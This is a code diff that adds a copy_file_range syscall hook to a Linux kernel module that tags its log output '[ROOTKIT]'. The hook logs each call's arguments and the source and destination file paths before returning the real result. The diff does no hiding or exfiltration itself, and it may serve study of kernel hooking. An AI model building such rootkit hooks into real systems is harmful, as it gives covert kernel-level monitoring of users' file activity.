@@ -165,3 +165,32 @@ SYSCALL_HOOK_HANDLER4(sendfile, orig_sendfile, p_regs, int, i32_out_fd, int, i32
 
     return i64_ret;
 }
+
+// sys_copy_file_range syscall hook handler
+SYSCALL_HOOK_HANDLER6(copy_file_range, orig_copy_file_range, p_regs, int, i32_in_fd,
+                      loff_t __user *, p_in_offset, int, i32_out_fd, loff_t __user *, p_out_offset,
+                      size_t, sz_len, unsigned int, ui32_flags)
+{
+    long i64_ret               = 0;    // Return value of the real syscall
+    const char *s_pathname_in  = NULL; // Pathname of the input file
+    const char *s_pathname_out = NULL; // Pathname of the output file
+
+    pr_info("[ROOTKIT] copy_file_range(%d, %p, %d, %p, %zu, %#x)", i32_in_fd, p_in_offset,
+            i32_out_fd, p_out_offset, sz_len, ui32_flags);
+
+    i64_ret = orig_copy_file_range(p_regs);
+    pr_cont(" = %ld\n", i64_ret);
+
+    s_pathname_in  = fd_get_pathname(i32_in_fd);
+    s_pathname_out = fd_get_pathname(i32_out_fd);
+    IF_U (IS_ERR_OR_NULL(s_pathname_in)) {
+        s_pathname_in = kstrdup_const("(error)", GFP_KERNEL);
+    }
+    IF_U (IS_ERR_OR_NULL(s_pathname_out)) {
+        s_pathname_out = kstrdup_const("(error)", GFP_KERNEL);
+    }
+    pr_info("[ROOTKIT] *  In file name: %s\n", s_pathname_in);
+    pr_info("[ROOTKIT] * Out file name: %s\n", s_pathname_out);
+
+    return i64_ret;
+}
